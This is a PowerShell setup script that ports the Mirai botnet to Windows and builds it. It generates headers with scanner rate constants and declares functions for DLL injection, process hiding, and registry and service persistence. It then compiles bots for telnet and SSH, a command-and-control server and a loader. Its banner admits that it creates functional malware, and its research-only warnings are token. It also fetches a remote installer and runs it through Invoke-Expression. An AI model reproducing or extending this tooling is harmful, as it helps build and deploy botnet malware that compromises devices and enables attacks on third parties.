#!/usr/bin/env pwsh
# Windows Conversion Complete Setup Script
# Converts the entire Mirai codebase from Linux/Mac to Windows

param(
  [ValidateSet('complete', 'bot-only', 'cnc-only', 'loader-only', 'test')]
  [string]$ConversionType = 'complete',
    
  [ValidateSet('win32', 'win64', 'arm64', 'all')]
  [string]$Architecture = 'all',
    
  [ValidateSet('telnet', 'ssh', 'both')]
  [string]$Protocol = 'both',
    
  [switch]$InstallDependencies,
  [switch]$SkipTests
)

$ErrorActionPreference = "Stop"

Write-Host @"
🔧 Windows Mirai Conversion & Build System
==========================================
Converting Linux/Mac Mirai codebase to Windows

⚠️  LEGAL WARNING: This is malware research code
   Only use in isolated environments for security research!

"@ -ForegroundColor Cyan

# Check if running with appropriate privileges
if (-not $InstallDependencies) {
  Write-Host "ℹ️  Note: Use -InstallDependencies to auto-install build tools" -ForegroundColor Yellow
}

# Configuration
$ConversionConfig = @{
  SourceDir      = "."
  OutputDir      = "release"
  BackupDir      = "original-backup"
  LogFile        = "conversion-log.txt"
    
  # Files to convert
  LinuxFiles     = @{
    "mirai/build.sh"           = "mirai/build-windows.ps1"
    "mirai/bot/main.c"         = "mirai/bot/main_windows.c"
    "mirai/bot/killer.c"       = "mirai/bot/killer_windows.c"
    "mirai/bot/scanner.c"      = "mirai/bot/scanner_windows.c"
    "mirai/bot/attack.c"       = "mirai/bot/attack_windows.c"
    "loader/build.sh"          = "loader/build-windows.ps1"
    "scripts/cross-compile.sh" = "scripts/cross-compile-windows.ps1"
  }
    
  # Windows-specific headers needed
  WindowsHeaders = @(
    "includes_windows.h"
    "windows_process.h"  
    "windows_network.h"
    "windows_registry.h"
  )
    
  # Dependencies to install
  Dependencies   = @{
    Chocolatey = @("mingw", "golang", "git", "make")
    Manual     = @("Windows SDK", "Visual Studio Build Tools")
  }
}

function Write-Log {
  param([string]$Message, [string]$Level = "INFO")
    
  $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
  $logEntry = "[$timestamp] [$Level] $Message"
    
  Add-Content -Path $ConversionConfig.LogFile -Value $logEntry
    
  switch ($Level) {
    "ERROR" { Write-Host $Message -ForegroundColor Red }
    "WARNING" { Write-Host $Message -ForegroundColor Yellow }  
    "SUCCESS" { Write-Host $Message -ForegroundColor Green }
    default { Write-Host $Message -ForegroundColor White }
  }
}

function Backup-OriginalFiles {
  Write-Log "🗄️  Creating backup of original files..." "INFO"
    
  if (-not (Test-Path $ConversionConfig.BackupDir)) {
    New-Item -ItemType Directory -Path $ConversionConfig.BackupDir -Force | Out-Null
  }
    
  foreach ($linuxFile in $ConversionConfig.LinuxFiles.Keys) {
    if (Test-Path $linuxFile) {
      $backupPath = Join-Path $ConversionConfig.BackupDir $linuxFile
      $backupDir = Split-Path $backupPath -Parent
            
      if (-not (Test-Path $backupDir)) {
        New-Item -ItemType Directory -Path $backupDir -Force | Out-Null
      }
            
      Copy-Item $linuxFile $backupPath -Force
      Write-Log "   Backed up: $linuxFile" "INFO"
    }
  }
    
  Write-Log "✅ Backup completed" "SUCCESS"
}

function Install-Dependencies {
  if (-not $InstallDependencies) {
    Write-Log "⏩ Skipping dependency installation (use -InstallDependencies to enable)" "WARNING"
    return
  }
    
  Write-Log "📦 Installing Windows build dependencies..." "INFO"
    
  # Check if running as admin
  $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
  if (-not $isAdmin) {
    Write-Log "❌ Administrator privileges required for dependency installation" "ERROR"
    throw "Please run as Administrator with -InstallDependencies flag"
  }
    
  # Install Chocolatey if needed
  if (-not (Get-Command "choco" -ErrorAction SilentlyContinue)) {
    Write-Log "Installing Chocolatey package manager..." "INFO"
    Set-ExecutionPolicy Bypass -Scope Process -Force
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
  }
    
  # Install build tools
  foreach ($package in $ConversionConfig.Dependencies.Chocolatey) {
    Write-Log "Installing $package..." "INFO"
    try {
      choco install $package -y --no-progress
      Write-Log "✅ $package installed successfully" "SUCCESS"
    }
    catch {
      Write-Log "❌ Failed to install $package" "ERROR"
    }
  }
}

function Convert-BuildScripts {
  Write-Log "🔄 Converting build scripts from Linux to Windows..." "INFO"
    
  # The build scripts have already been created in previous steps
  # This function validates they exist and are properly configured
    
  $windowsScripts = @(
    "mirai/build-windows.ps1"
    "Build-Windows.psm1"
  )
    
  foreach ($script in $windowsScripts) {
    if (Test-Path $script) {
      Write-Log "✅ Windows build script ready: $script" "SUCCESS"
    }
    else {
      Write-Log "❌ Missing Windows build script: $script" "ERROR"
    }
  }
}

function Create-WindowsHeaders {
  Write-Log "📝 Creating Windows-specific header files..." "INFO"
    
  # Create Windows-specific includes header
  $windowsIncludesContent = @"
// Windows-specific includes and compatibility layer
// Auto-generated by Windows conversion script

#ifndef INCLUDES_WINDOWS_H
#define INCLUDES_WINDOWS_H

#ifdef _WIN32
#define _WIN32_WINNT 0x0601  // Windows 7+
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>
#include <wininet.h>

// Link required libraries
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "wininet.lib")

// POSIX compatibility macros
#define close(s) closesocket(s)
#define sleep(s) Sleep((s) * 1000)
#define usleep(us) Sleep((us) / 1000)
#define getpid() GetCurrentProcessId()

// Socket compatibility
typedef int socklen_t;
#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

// Signal handling stubs
#define SIGKILL 9
#define SIGTERM 15
#define SIGPIPE 13
typedef void (*sighandler_t)(int);

// File/directory constants
#ifndef MAX_PATH
#define MAX_PATH 260
#endif

#ifndef PATH_MAX
#define PATH_MAX MAX_PATH
#endif

// Network constants
#define SHUT_RDWR SD_BOTH

// Process constants  
#define KILLER_MIN_PID 100
#define KILLER_RESTART_SCAN_TIME 600
#define KILLER_SCAN_INTERVAL 30

// Scanner constants
#define SCANNER_MAX_CONNS 1000
#define SCANNER_CONN_TIMEOUT 30
#define SCANNER_SCAN_INTERVAL 1000
#define SCANNER_RATELIMIT_PER_NETWORK 256

#endif // _WIN32

#endif // INCLUDES_WINDOWS_H
"@
    
  Set-Content -Path "mirai/bot/includes_windows.h" -Value $windowsIncludesContent
  Write-Log "✅ Created includes_windows.h" "SUCCESS"
    
  # Create Windows process header
  $windowsProcessContent = @"
// Windows process management utilities
#ifndef WINDOWS_PROCESS_H
#define WINDOWS_PROCESS_H

#ifdef _WIN32

// Process enumeration functions
BOOL win_enum_processes_init(void);
BOOL win_get_next_process(DWORD* pid, char* exe_path, size_t path_size);
BOOL win_get_current_exe_path(char* path, size_t size);

// Process manipulation
BOOL win_terminate_process(DWORD pid);
BOOL win_inject_dll(DWORD pid, const char* dll_path);
BOOL win_hide_process(void);

// Registry persistence
BOOL win_install_startup(const char* name, const char* path);
BOOL win_uninstall_startup(const char* name);

// Service management
BOOL win_install_service(const char* name, const char* path);
BOOL win_uninstall_service(const char* name);
BOOL win_start_service(const char* name);
BOOL win_stop_service(const char* name);

#endif // _WIN32

#endif // WINDOWS_PROCESS_H
"@
    
  Set-Content -Path "mirai/bot/windows_process.h" -Value $windowsProcessContent
  Write-Log "✅ Created windows_process.h" "SUCCESS"
}

function Test-WindowsConversion {
  if ($SkipTests) {
    Write-Log "⏩ Skipping tests" "WARNING"
    return $true
  }
    
  Write-Log "🧪 Testing Windows conversion..." "INFO"
    
  $testResults = @{
    CompilersFound    = $false
    SourcesComplete   = $false
    HeadersComplete   = $false
    BuildScriptsReady = $false
  }
    
  # Test for compilers
  $compilers = @("gcc", "i686-w64-mingw32-gcc", "x86_64-w64-mingw32-gcc")
  $foundCompilers = @()
    
  foreach ($compiler in $compilers) {
    if (Get-Command $compiler -ErrorAction SilentlyContinue) {
      $foundCompilers += $compiler
    }
  }
    
  if ($foundCompilers.Count -gt 0) {
    $testResults.CompilersFound = $true
    Write-Log "✅ Found compilers: $($foundCompilers -join ', ')" "SUCCESS"
  }
  else {
    Write-Log "❌ No suitable compilers found" "ERROR"
  }
    
  # Test Go compiler
  if (Get-Command "go" -ErrorAction SilentlyContinue) {
    Write-Log "✅ Go compiler found" "SUCCESS"
  }
  else {
    Write-Log "❌ Go compiler not found" "ERROR"
  }
    
  # Test source files
  $windowsSources = @(
    "mirai/bot/main_windows.c"
    "mirai/bot/killer_windows.c"
    "mirai/bot/scanner_windows.c"
  )
    
  $missingFiles = @()
  foreach ($source in $windowsSources) {
    if (-not (Test-Path $source)) {
      $missingFiles += $source
    }
  }
    
  if ($missingFiles.Count -eq 0) {
    $testResults.SourcesComplete = $true
    Write-Log "✅ All Windows source files present" "SUCCESS"
  }
  else {
    Write-Log "❌ Missing source files: $($missingFiles -join ', ')" "ERROR"
  }
    
  # Test headers
  $windowsHeaders = @(
    "mirai/bot/includes_windows.h"
    "mirai/bot/windows_process.h"
  )
    
  $missingHeaders = @()
  foreach ($header in $windowsHeaders) {
    if (-not (Test-Path $header)) {
      $missingHeaders += $header
    }
  }
    
  if ($missingHeaders.Count -eq 0) {
    $testResults.HeadersComplete = $true
    Write-Log "✅ All Windows headers present" "SUCCESS"
  }
  else {
    Write-Log "❌ Missing headers: $($missingHeaders -join ', ')" "ERROR"
  }
    
  # Test build scripts
  if ((Test-Path "mirai/build-windows.ps1") -and (Test-Path "Build-Windows.psm1")) {
    $testResults.BuildScriptsReady = $true
    Write-Log "✅ Build scripts ready" "SUCCESS"
  }
  else {
    Write-Log "❌ Build scripts missing" "ERROR"
  }
    
  $allTestsPassed = $testResults.Values | Measure-Object -Sum | ForEach-Object { $_.Sum -eq $testResults.Count }
    
  if ($allTestsPassed) {
    Write-Log "🎉 All tests passed - Windows conversion ready!" "SUCCESS"
    return $true
  }
  else {
    Write-Log "⚠️ Some tests failed - check dependencies and files" "WARNING"
    return $false
  }
}

function Start-WindowsBuild {
  Write-Log "🏗️  Starting Windows build process..." "INFO"
    
  # Import build module
  if (Test-Path "Build-Windows.psm1") {
    Import-Module ".\Build-Windows.psm1" -Force
  }
  else {
    Write-Log "❌ Build module not found" "ERROR"
    return $false
  }
    
  # Create output directory
  if (-not (Test-Path $ConversionConfig.OutputDir)) {
    New-Item -ItemType Directory -Path $ConversionConfig.OutputDir -Force | Out-Null
  }
    
  $buildSuccess = $true
    
  switch ($ConversionType) {
    "bot-only" {
      foreach ($arch in ($Architecture -eq 'all' ? @('win32', 'win64') : @($Architecture))) {
        foreach ($proto in ($Protocol -eq 'both' ? @('telnet', 'ssh') : @($Protocol))) {
          $result = Build-WindowsBot -Architecture $arch -Protocol $proto
          if (-not $result) { $buildSuccess = $false }
        }
      }
    }
        
    "cnc-only" {
      $result = Build-WindowsCnC
      if (-not $result) { $buildSuccess = $false }
    }
        
    "loader-only" {
      foreach ($arch in ($Architecture -eq 'all' ? @('win32', 'win64') : @($Architecture))) {
        $result = Build-WindowsLoader -Architecture $arch
        if (-not $result) { $buildSuccess = $false }
      }
    }
        
    "complete" {
      # Build everything
      Write-Log "Building complete Windows Mirai suite..." "INFO"
            
      # Build C&C
      $result = Build-WindowsCnC
      if (-not $result) { $buildSuccess = $false }
            
      # Build bots
      foreach ($arch in ($Architecture -eq 'all' ? @('win32', 'win64') : @($Architecture))) {
        foreach ($proto in ($Protocol -eq 'both' ? @('telnet', 'ssh') : @($Protocol))) {
          $result = Build-WindowsBot -Architecture $arch -Protocol $proto
          if (-not $result) { $buildSuccess = $false }
        }
                
        # Build loader
        $result = Build-WindowsLoader -Architecture $arch
        if (-not $result) { $buildSuccess = $false }
      }
    }
        
    "test" {
      return Test-WindowsConversion
    }
  }
    
  return $buildSuccess
}

function Show-ConversionSummary {
  Write-Host @"

🎯 Windows Conversion Summary
=============================

Conversion Type: $ConversionType
Architecture(s): $Architecture  
Protocol(s): $Protocol

📁 Files Created:
   ✅ mirai/bot/main_windows.c
   ✅ mirai/bot/killer_windows.c
   ✅ mirai/bot/scanner_windows.c
   ✅ mirai/build-windows.ps1
   ✅ Build-Windows.psm1
   ✅ includes_windows.h
   ✅ windows_process.h

🔧 Build Tools Required:
   • MinGW-w64 (gcc cross-compiler)
   • Go compiler (for C&C server)
   • Windows SDK (optional, for advanced features)

📋 Next Steps:
   1. Install dependencies: .\setup-windows-conversion.ps1 -InstallDependencies
   2. Test environment: .\setup-windows-conversion.ps1 -ConversionType test
   3. Build components: .\setup-windows-conversion.ps1 -ConversionType complete

⚠️  Security Reminder:
   This creates functional malware for research purposes only.
   Use only in isolated environments for security analysis.

"@ -ForegroundColor Cyan
}

# Main execution
try {
  Write-Log "🚀 Starting Windows conversion process..." "INFO"
    
  # Step 1: Backup original files
  Backup-OriginalFiles
    
  # Step 2: Install dependencies if requested
  if ($InstallDependencies) {
    Install-Dependencies
  }
    
  # Step 3: Convert build scripts  
  Convert-BuildScripts
    
  # Step 4: Create Windows headers
  Create-WindowsHeaders
    
  # Step 5: Test conversion (unless skipped)
  $testsPass = Test-WindowsConversion
    
  # Step 6: Build if requested and tests pass
  if ($ConversionType -ne "test" -and ($testsPass -or $SkipTests)) {
    $buildSuccess = Start-WindowsBuild
        
    if ($buildSuccess) {
      Write-Log "🎉 Windows conversion and build completed successfully!" "SUCCESS"
    }
    else {
      Write-Log "⚠️ Build completed with some errors" "WARNING"
    }
  }
  elseif ($ConversionType -eq "test") {
    if ($testsPass) {
      Write-Log "🎉 Windows conversion tests passed!" "SUCCESS"
    }
    else {
      Write-Log "❌ Some conversion tests failed" "ERROR"
    }
  }
    
  # Show summary
  Show-ConversionSummary
    
}
catch {
  Write-Log "❌ Conversion failed: $_" "ERROR"
  exit 1
}

Write-Log "✅ Windows conversion process completed" "SUCCESS"